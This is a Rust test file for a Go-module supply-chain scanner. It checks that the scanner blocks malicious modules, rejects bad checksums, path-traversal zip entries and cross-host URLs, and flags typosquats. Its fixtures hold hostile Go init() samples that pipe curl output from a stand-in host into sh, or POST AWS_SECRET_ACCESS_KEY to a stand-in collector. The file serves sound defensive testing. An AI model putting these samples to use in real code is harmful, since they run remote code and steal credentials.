//! End-to-end tests for `fetch_and_scan_go` via MockTransport.
//!
//! No network is touched: the mock serves the GOPROXY `@latest`, `.zip`,
//! and `.ziphash` routes. The `.ziphash` value is the real dirhash `h1:`
//! recomputed over the same zip the test builds, so the integrity path is
//! exercised honestly (a mismatch or missing route must hard-error).

use argus_core::Decision;
use argus_go::dirhash::compute_h1;
use argus_go::{fetch_and_scan_go, GoFetchOptions, GoModuleRef};
use argus_test_support::MockTransport;
use std::io::Write;

const REGISTRY: &str = "https://mock.proxy";

/// Build a Go module `.zip`. Every entry is prefixed
/// `<module>@<version>/` per Go's module zip layout. `files` is a list of
/// (path-under-module-root, body) pairs.
fn make_module_zip(module: &str, version: &str, files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        let prefix = format!("{module}@{version}");
        for (path, body) in files {
            writer.start_file(format!("{prefix}/{path}"), opts).unwrap();
            writer.write_all(body).unwrap();
        }
        writer.finish().unwrap();
    }
    buf
}

/// Recompute the dirhash h1 over the same logical file set the zip
/// carries, so the `.ziphash` route serves a value that matches the real
/// extracted bytes.
fn h1_for(module: &str, version: &str, files: &[(&str, &[u8])]) -> String {
    let prefix = format!("{module}@{version}");
    let pairs: Vec<(String, Vec<u8>)> = files
        .iter()
        .map(|(p, b)| (format!("{prefix}/{p}"), b.to_vec()))
        .collect();
    compute_h1(&pairs)
}

fn register(
    transport: &MockTransport,
    module: &str,
    version: &str,
    zip: Vec<u8>,
    ziphash: Option<String>,
) {
    transport.insert(&format!("{REGISTRY}/{module}/@v/{version}.zip"), zip);
    if let Some(h) = ziphash {
        transport.insert(
            &format!("{REGISTRY}/{module}/@v/{version}.ziphash"),
            h.into_bytes(),
        );
    }
}

fn opts() -> GoFetchOptions {
    GoFetchOptions {
        registry: REGISTRY.to_string(),
        ..GoFetchOptions::default()
    }
}

#[test]
fn malicious_init_exec_blocks() {
    let module = "example.com/evilmod";
    let version = "v1.0.0";
    let go_mod = b"module example.com/evilmod\n\ngo 1.21\n";
    let main_go = br#"
package evilmod

import "os/exec"

func init() {
    exec.Command("sh", "-c", "curl http://evil.example.invalid|sh").Run()
}
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("evil.go", main_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"go-init-function"), "got: {rule_ids:?}");
    assert!(rule_ids.contains(&"go-init-exec"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn clean_library_allows() {
    let module = "example.com/cleanmod";
    let version = "v1.2.3";
    let go_mod = b"module example.com/cleanmod\n\ngo 1.21\n";
    let lib_go = b"package cleanmod\n\nfunc Add(a, b int) int { return a + b }\n";
    let util_go = b"package cleanmod\n\nfunc Mul(a, b int) int { return a * b }\n";
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("lib.go", lib_go), ("util.go", util_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    assert!(
        report.findings.is_empty(),
        "expected no findings, got: {:?}",
        report.findings
    );
    eprintln!(
        "FINDINGS: {:#?}",
        report
            .findings
            .iter()
            .map(|f| (f.rule_id.as_str(), f.severity))
            .collect::<Vec<_>>()
    );
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn init_present_but_benign_is_info_only_allow() {
    let module = "example.com/drivermod";
    let version = "v0.1.0";
    let go_mod = b"module example.com/drivermod\n\ngo 1.21\n";
    let reg_go = br#"
package drivermod

func registerDriver() {}

func init() {
    registerDriver()
}
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("reg.go", reg_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"go-init-function"), "got: {rule_ids:?}");
    // Only the Info structural finding fired — it must NOT block.
    assert!(!rule_ids.contains(&"go-init-exec"), "got: {rule_ids:?}");
    assert!(!rule_ids.contains(&"go-init-network"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Allow);
}

#[test]
fn integrity_match_succeeds() {
    let module = "example.com/intmod";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/intmod\n\ngo 1.21\n"),
        ("x.go", b"package intmod\nfunc X() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
    assert_eq!(report.decision, Decision::Allow);
    assert_eq!(report.package_version.as_deref(), Some(version));
}

#[test]
fn integrity_mismatch_hard_errors() {
    let module = "example.com/intmod";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/intmod\n\ngo 1.21\n"),
        ("x.go", b"package intmod\nfunc X() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);
    // Serve a syntactically valid but WRONG h1.
    let bad_h1 = "h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string();

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(bad_h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_go(&pkg, &opts(), &transport).unwrap_err()
    );
    assert!(
        err.contains("checksum mismatch") || err.contains("h1"),
        "got: {err}"
    );
}

#[test]
fn ziphash_endpoint_missing_hard_errors() {
    let module = "example.com/intmod";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module example.com/intmod\n\ngo 1.21\n"),
        ("x.go", b"package intmod\nfunc X() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);

    let transport = MockTransport::new();
    // Register the zip but NOT the .ziphash route (simulates a private
    // GOPROXY that omits it). Integrity is mandatory — must hard-error.
    register(&transport, module, version, zip, None);

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let err = format!(
        "{:#}",
        fetch_and_scan_go(&pkg, &opts(), &transport).unwrap_err()
    );
    assert!(
        err.contains(".ziphash") || err.contains("no route"),
        "got: {err}"
    );
}

#[test]
fn host_allowlist_rejects_cross_host_artifact_url() {
    // The host allowlist is empty for Go (the proxy serves zip + metadata
    // from one host), so an artifact URL on a foreign host must be
    // rejected outright. This exercises the same `validate_artifact_url`
    // gate `fetch_and_scan_go` runs before any download. (The orchestrator
    // builds zip URLs from the registry host, so a cross-host URL can only
    // arise from a malicious redirect / crafted URL — which this rejects.)
    use argus_core::url::validate_artifact_url;
    let foreign: &[&str] = &[];
    let err = validate_artifact_url(
        "https://evil.example.invalid/example.com/m/@v/v1.0.0.zip",
        "proxy.golang.org",
        foreign,
    )
    .unwrap_err()
    .to_string();
    assert!(err.contains("evil.example.invalid"), "got: {err}");
}

#[test]
fn path_escape_zip_entry_is_rejected() {
    // A zip whose entry name traverses parent dirs must be refused by the
    // copied wheel.rs ParentDir guard before any scan happens.
    let mut buf = Vec::new();
    {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<()> = zip::write::FileOptions::default();
        // Deliberately unsafe traversal name.
        writer.start_file("../escaped.go", opts).unwrap();
        writer.write_all(b"package m\n").unwrap();
        writer.finish().unwrap();
    }

    let err = format!(
        "{:#}",
        argus_go::extract_module_zip(&buf, 1024 * 1024).unwrap_err()
    );
    assert!(
        err.contains("unsafe path") || err.contains("parent dir"),
        "got: {err}"
    );
}

#[test]
fn typosquat_blocks() {
    // Clean source, but the module path is one edit from sirupsen/logrus.
    let module = "github.com/sirupsen/logruss";
    let version = "v1.0.0";
    let files: &[(&str, &[u8])] = &[
        ("go.mod", b"module github.com/sirupsen/logruss\n\ngo 1.21\n"),
        ("log.go", b"package logruss\nfunc Info() {}\n"),
    ];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"typosquatting"), "got: {rule_ids:?}");
    assert!(rule_ids.contains(&"low-reputation"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Block);
}

#[test]
fn init_network_env_exfil_blocks() {
    let module = "example.com/exfilmod";
    let version = "v1.0.0";
    let go_mod = b"module example.com/exfilmod\n\ngo 1.21\n";
    let exfil_go = br#"
package exfilmod

import (
    "net/http"
    "os"
    "strings"
)

func init() {
    secret := os.Getenv("AWS_SECRET_ACCESS_KEY")
    http.Post("https://collect.example.invalid", "text/plain", strings.NewReader(secret))
}
"#;
    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("exfil.go", exfil_go)];
    let zip = make_module_zip(module, version, files);
    let h1 = h1_for(module, version, files);

    let transport = MockTransport::new();
    register(&transport, module, version, zip, Some(h1));

    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();

    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(rule_ids.contains(&"go-init-network"), "got: {rule_ids:?}");
    assert!(rule_ids.contains(&"go-init-env-exfil"), "got: {rule_ids:?}");
    assert_eq!(report.decision, Decision::Block);
}
